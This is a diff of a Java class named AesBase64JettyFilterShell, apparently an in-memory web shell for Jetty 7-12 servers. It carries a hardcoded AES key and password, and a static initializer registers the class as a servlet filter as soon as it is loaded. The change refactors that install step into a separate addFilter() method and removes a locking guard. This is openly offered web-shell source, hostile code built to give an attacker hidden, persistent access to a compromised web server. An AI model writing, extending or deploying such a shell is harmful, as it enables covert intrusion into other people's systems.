@@ -4,15 +4,13 @@ import java.util.*;
 
 //jetty7-12 test
 public class AesBase64JettyFilterShell extends ClassLoader implements InvocationHandler {
-    private static boolean initialized = false;
-    private static final Object lock = new Object();
     private static Class payloadClass;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
 
 
     static {
-        new AesBase64JettyFilterShell();
+        new AesBase64JettyFilterShell().addFilter();
     }
 
     public AesBase64JettyFilterShell(ClassLoader loader) {
@@ -20,15 +18,14 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
     }
 
     public AesBase64JettyFilterShell() {
-        synchronized (lock) {
-            if (!initialized) {
-                initialized = true;
-                try {
-                    addFilter(this);
-                } catch (Throwable e) {
 
-                }
-            }
+    }
+
+    private void addFilter() {
+        try {
+            addFilter(this);
+        } catch (Throwable e) {
+
         }
     }
 
